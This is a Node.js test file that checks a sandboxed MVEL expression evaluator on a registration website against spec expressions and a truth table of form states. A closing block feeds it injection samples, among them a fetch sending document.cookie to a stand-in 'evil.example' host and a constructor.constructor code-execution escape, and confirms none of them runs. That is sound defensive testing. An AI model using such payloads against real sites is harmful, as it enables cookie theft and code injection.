// Checks the safe MVEL evaluator in index.html against a truth table for every expression in spec.json.
//   node website/test/mvel.test.mjs [path/to/reference.html]
// With a reference page (e.g. the upstream build that used `new Function`), results are also compared 1:1.
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const here = path.dirname(fileURLToPath(import.meta.url));
const site = path.resolve(here, '..');

function loadMvel(html) {
  const start = html.indexOf('/* Parsed, never executed') >= 0 ? html.indexOf('/* Parsed, never executed') : html.indexOf('function mvel(expr){');
  const end = html.indexOf('function fieldVisible(f){');
  if (start < 0 || end < 0) throw new Error('mvel functions not found');
  const ctx = { S: { reg: { groups: [], data: {} } }, __fields: [], __age: null };
  vm.createContext(ctx);
  vm.runInContext(`
    function idGet(k){ if(k==='ageGroup') return __age; var v=S.reg.data[k]; return (v==null||v==='')?null:v; }
    function updFields(){ return __fields; }
    ${html.slice(start, end)}
  `, ctx);
  return ctx;
}

const spec = readFileSync(path.join(site, 'spec.json'), 'utf8');
const exprs = new Set();
(function walk(o) {
  if (Array.isArray(o)) o.forEach(walk);
  else if (o && typeof o === 'object') Object.values(o).forEach((v) => {
    if (typeof v === 'string' && /identity|\bnil\b|contains/.test(v)) exprs.add(v); else walk(v);
  });
})(JSON.parse(spec));

const states = [];
for (const age of [null, 'INFANT', 'MINOR', 'ADULT'])
  for (const intro of [{}, { introducerName: 'Asha' }, { introducerName: 'Asha', introducerRID: '1'.repeat(29) }, { introducerName: 'Asha', introducerUIN: '1234567890' }, { introducerName: '' }])
    for (const groups of [[], ['Biometrics'], ['IntroducerDetails'], ['DateOfBirth', 'Biometrics']])
      for (const fields of [[], ['fullName'], ['dateOfBirth', 'permanentAddress']])
        states.push({ age, intro, groups, fields });

function evaluate(ctx, expr, st) {
  ctx.__age = st.age; ctx.S.reg.data = { ...st.intro }; ctx.S.reg.groups = st.groups; ctx.__fields = st.fields;
  return ctx.mvel(expr);
}

const ours = loadMvel(readFileSync(path.join(site, 'index.html'), 'utf8'));
const refPath = process.argv[2];
const ref = refPath ? loadMvel(readFileSync(refPath, 'utf8')) : null;

let checks = 0, mismatches = 0;
for (const e of exprs) for (const st of states) {
  const a = evaluate(ours, e, st);
  if (typeof a !== 'boolean') { console.error('non-boolean result', e); process.exitCode = 1; }
  if (ref) { const b = evaluate(ref, e, st); if (a !== b) { mismatches++; if (mismatches < 10) console.error('MISMATCH', JSON.stringify(st), e, 'ours', a, 'ref', b); } }
  checks++;
}

// Semantics spot checks (independent of any reference)
const spot = (expr, st, want) => { const got = evaluate(ours, expr, { age: null, intro: {}, groups: [], fields: [], ...st }); if (got !== want) { console.error('SPOT FAIL', expr, got, want); process.exitCode = 1; } checks++; };
spot("identity.get('ageGroup') == 'INFANT' || identity.get('ageGroup') == 'MINOR'", { age: 'MINOR' }, true);
spot("identity.get('ageGroup') == 'INFANT' || identity.get('ageGroup') == 'MINOR'", { age: 'ADULT' }, false);
spot("identity.updatableFieldGroups contains 'Biometrics'", { groups: ['Biometrics'] }, true);
spot("!(identity.updatableFieldGroups contains 'Biometrics')", { groups: ['Biometrics'] }, false);
spot("identity.get('introducerRID') == nil", {}, true);
spot("identity.get('introducerRID') == empty", { intro: { introducerRID: '' } }, true);
spot("identity.get('introducerRID') != nil", { intro: { introducerRID: '5' } }, true);

// Injection attempts must never run code; unsupported input fails safe to true.
globalThis.__pwned = false;
ours.__pwned = false;
for (const evil of [
  "fetch('https://evil.example/?'+document.cookie)",
  "(function(){__pwned=true})()",
  "identity.get('x') == 'a' || (__pwned=true)",
  "constructor.constructor('__pwned=true')()",
  "identity.get('x') ==",
  "",
]) {
  const r = ours.mvel(evil);
  if (r !== true) { console.error('UNSAFE/UNEXPECTED result for', evil, r); process.exitCode = 1; }
  checks++;
}
if (ours.__pwned || globalThis.__pwned) { console.error('CODE EXECUTED'); process.exitCode = 1; }

if (mismatches) process.exitCode = 1;
console.log(`${exprs.size} spec expressions x ${states.length} states${ref ? ' compared with reference' : ''}: ${checks} checks, ${mismatches} mismatches, ${process.exitCode ? 'FAILED' : 'OK'}`);
